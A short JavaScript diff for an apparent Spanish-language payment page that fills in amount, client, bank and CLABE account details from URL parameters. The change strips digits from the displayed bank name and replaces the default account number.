@@ -88,8 +88,13 @@
         document.getElementById('txt-monto').innerText = '$' + (p.get('m') || '0.00');
         document.getElementById('txt-nom').innerText = p.get('n') || 'Cliente';
         document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
-        document.getElementById('txt-banco').innerText = p.get('b') || 'BBVA';
-        document.getElementById('txt-clabe').innerText = p.get('c') || '012180015723266626';
+        
+        // Limpia el "1" o "2" del nombre del banco para mostrar solo BBVA al cliente
+        let bancoLimpio = p.get('b') || 'BBVA';
+        bancoLimpio = bancoLimpio.replace(/[12]/g, '').trim();
+        document.getElementById('txt-banco').innerText = bancoLimpio;
+        
+        document.getElementById('txt-clabe').innerText = p.get('c') || '012010015159069318';
 
         let tiempo = 900; 
         const display = document.getElementById('contador');
